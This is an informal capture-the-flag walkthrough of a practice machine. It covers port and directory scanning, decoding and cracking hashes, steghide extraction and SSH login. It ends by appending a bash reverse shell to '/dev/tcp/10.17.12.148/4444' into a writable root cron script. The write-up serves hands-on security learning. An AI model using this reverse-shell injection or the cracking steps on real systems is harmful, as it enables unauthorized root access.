lets get started
lets do a normal scan first 
```bash
rustscan -a 10.10.2.105
```

nmap was taking too much time so tried rustscan this time
```bash
Open 10.10.2.105:80
Open 10.10.2.105:6498
Open 10.10.2.105:65524
```

for getting service information used good old nmap
```bash
nmap -p80,6498,65524 10.10.2.105 -A
```
got nginix server running on port 80 

the website is the default page of nginix
so lets do a dirbuster to get the directories
```bash
gobuster dir -e -u http://10.10.2.105/ -w /usr/share/dirb/wordlists/common.txt
```
we got three directories
```bash
http://10.10.2.105/hidden               (Status: 301) [Size: 169]
http://10.10.2.105/index.html           (Status: 200) [Size: 612]
http://10.10.2.105/robots.txt           (Status: 200) [Size: 43]
```
didt get much so lets dir bursting on hidden directory also
found another endpoint
```bash
http://10.10.2.105/hidden/index.html           (Status: 200) [Size: 390]
http://10.10.2.105/hidden/whatever             (Status: 301) [Size: 169]
```
viewed the page source and got a hidden encrypted data
```bash
ZmxhZ3tmMXJzN19mbDRnfQ==
```
it is Base64 so launched cyberchef and got the flag - flag{f1rs7_fl4g}

Lets enumerate our next target
after visiting the site at port 65524 it was a apache default page and then i performed a dirrectory bursting on that but found nothing usual, 
```bash
gobuster dir -e -u http://10.10.2.105:65524/ -w /usr/share/dirb/wordlists/common.txt
```
so went to robots.txt and found a hash, it was a md5 i guess, use md5hashing.net to crack the hash and we got the flag - flag{1m_s3c0nd_fl4g}

then after observing the code of the page straight forward got the third flag and also a hidden p tag that has some kind of encrypted text so we to cyberchef and applied magic and got that it was a directory - /n0th1ng3ls3m4tt3r 

got another hash the lab has given a txt file we can use it to crack the hash
so used the john the ripper to crack the hash
```bash
john -format=gost -wordlist=./Downloads/easypeasy.txt hash
```

got the password - mypasswordforthatjob

also had an image which was suspicious and we have a password, it should be of something so used steghide to see it there is some hidden data
```bash
steghide extract -sf ./Downloads/Untitled.jpeg
```

we got a file it contains username and a password in binary we can just decrypt it
and boom we have ssh info i guess:
username: boring
password: iconvertedmypasswordtobinary

we can now ssh in the machine
we got into the machine and we found the user.txt but it is not in thm format and hits that it is roated, we can use rot decrypt sites to get the flag and we got it - flag{n0wits33msn0rm4l}

now lets escalate our privilages
so i was not getting it so read so articles  found one of them, so basically we have to check cron jobs and in that we found that there is a secret cron job, and we have the permission to edit it but we cannot run it, got the rev shell command that i found
```bash
cd /var/www && echo "bash -c 'exec bash -i &>/dev/tcp/10.17.12.148/4444 <&1'" >> .mysecretcronjob.sh
```

and waited for a few seconds and boom we got a root shell on our nc listener and now we can get to root directory and we got the flag

boom we solved the room !!!